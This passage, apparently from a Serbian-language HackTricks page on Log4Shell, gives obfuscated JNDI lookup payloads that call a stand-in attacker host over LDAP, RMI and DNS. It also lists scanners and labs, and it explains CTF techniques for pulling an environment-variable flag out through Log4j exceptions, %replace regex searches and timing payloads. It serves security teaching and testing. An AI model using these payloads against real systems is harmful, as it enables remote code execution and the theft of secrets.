${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ƒ±}}:ldap://...} //Notice the unicode "i"
```
### Automatski skeneri

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Pronaƒëite lokalne ranjive biblioteke

### Laboratorije za testiranje

* [**LogForge HTB ma≈°ina**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar soba**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Post-Log4Shell Eksploatacija

U ovom [**CTF izve≈°taju**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) je dobro obja≈°njeno kako je potencijalno **moguƒáe** da se **zloupotrebe** neke funkcije **Log4J**.

[**Sigurnosna stranica**](https://logging.apache.org/log4j/2.x/security.html) Log4j-a ima nekoliko zanimljivih reƒçenica:

> Od verzije 2.16.0 (za Java 8), **funkcija pretrage poruka je potpuno uklonjena**. **Pretrage u konfiguraciji i dalje rade**. ≈†tavi≈°e, Log4j sada po defaultu onemoguƒáava pristup JNDI-ju. JNDI pretrage u konfiguraciji sada treba eksplicitno omoguƒáiti.

> Od verzije 2.17.0, (i 2.12.3 i 2.3.1 za Java 7 i Java 6), **samo stringovi pretrage u konfiguraciji se rekurzivno pro≈°iruju**; u bilo kojoj drugoj upotrebi, samo se pretraga na najvi≈°em nivou re≈°ava, a sve ugnje≈ædene pretrage se ne re≈°avaju.

To znaƒçi da po defaultu mo≈æete **zaboraviti na kori≈°ƒáenje bilo kakvog `jndi` eksploita**. ≈†tavi≈°e, da biste izvr≈°ili **rekurzivne pretrage**, morate ih imati konfigurirane.

Na primer, u tom CTF-u ovo je bilo konfigurirano u datoteci log4j2.xml:
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

U [ovom CTF-u](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/) napadaƒç je kontrolisao vrednost `${sys:cmd}` i trebao je da eksfiltrira zastavu iz promenljive okru≈æenja.\
Kao ≈°to je prikazano na ovoj stranici u [**prethodnim payload-ima**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), postoje razliƒçiti naƒçini za pristup env promenljivama, kao ≈°to je: **`${env:FLAG}`**. U ovom CTF-u to je bilo beskorisno, ali mo≈æda neƒáe biti u drugim stvarnim scenarijima.

### Exfiltration in Exceptions

U CTF-u, **niste mogli pristupiti stderr** java aplikacije koristeƒái log4J, ali Log4J **izuzeci se ≈°alju na stdout**, koji je bio od≈°tampan u python aplikaciji. To je znaƒçilo da, pokretanjem izuzetka, mo≈æemo pristupiti sadr≈æaju. Izuzetak za eksfiltraciju zastave bio je: **`${java:${env:FLAG}}`.** Ovo funkcioni≈°e jer **`${java:CTF{blahblah}}`** ne postoji i izuzetak sa vredno≈°ƒáu zastave ƒáe biti prikazan:

![](<../../.gitbook/assets/image (1023).png>)

### Conversion Patterns Exceptions

Samo da napomenem, mogli ste takoƒëe da injektujete nove [**conversion patterns**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) i pokrenete izuzetke koji ƒáe biti zabele≈æeni na `stdout`. Na primer:

![](<../../.gitbook/assets/image (683).png>)

Ovo nije bilo korisno za eksfiltraciju podataka unutar poruke o gre≈°ci, jer pretraga nije re≈°ena pre konverzionog obrasca, ali bi moglo biti korisno za druge stvari kao ≈°to je detekcija.

### Conversion Patterns Regexes

Meƒëutim, moguƒáe je koristiti neke **conversion patterns koji podr≈æavaju regexes** za eksfiltraciju informacija iz pretrage koristeƒái regexes i zloupotrebljavajuƒái **binarno pretra≈æivanje** ili **vremenski zasnovano** pona≈°anje.

* **Binarno pretra≈æivanje putem poruka o izuzecima**

Konverzioni obrazac **`%replace`** mo≈æe se koristiti za **zamenu** **sadr≈æaja** iz **stringa** ƒçak i koristeƒái **regexes**. Funkcioni≈°e ovako: `replace{pattern}{regex}{substitution}`\
Zloupotrebljavajuƒái ovo pona≈°anje mogli biste uƒçiniti da zamena **pokrene izuzetak ako regex odgovara** bilo ƒçemu unutar stringa (i bez izuzetka ako nije pronaƒëeno) ovako:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Na osnovu vremena**

Kao ≈°to je pomenuto u prethodnom odeljku, **`%replace`** podr≈æava **regex**. Tako je moguƒáe koristiti payload sa [**ReDoS stranice**](../regular-expression-denial-of-service-redos.md) da izazove **timeout** u sluƒçaju da je zastavica pronaƒëena.\
Na primer, payload poput `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` bi izazvao **timeout** u tom CTF-u.

U ovom [**izve≈°taju**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), umesto kori≈°ƒáenja ReDoS napada, kori≈°ƒáen je **amplifikacioni napad** da izazove vremensku razliku u odgovoru:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Ako zastavica poƒçinje sa `flagGuess`, cela zastavica se zamenjuje sa 29 `#`-s (koristio sam ovaj karakter jer verovatno neƒáe biti deo zastavice). **Svaki od rezultantnih 29 `#`-s se zatim zamenjuje sa 54 `#`-s**. Ovaj proces se ponavlja **6 puta**, ≈°to dovodi do ukupnog broja ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-s!**
>
> Zamena toliko `#`-s izazvaƒáe 10-sekundni timeout Flask aplikacije, ≈°to ƒáe rezultirati slanjem HTTP status koda 500 korisniku. (Ako zastavica ne poƒçinje sa `flagGuess`, dobiƒáemo status kod koji nije 500)

## Reference

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
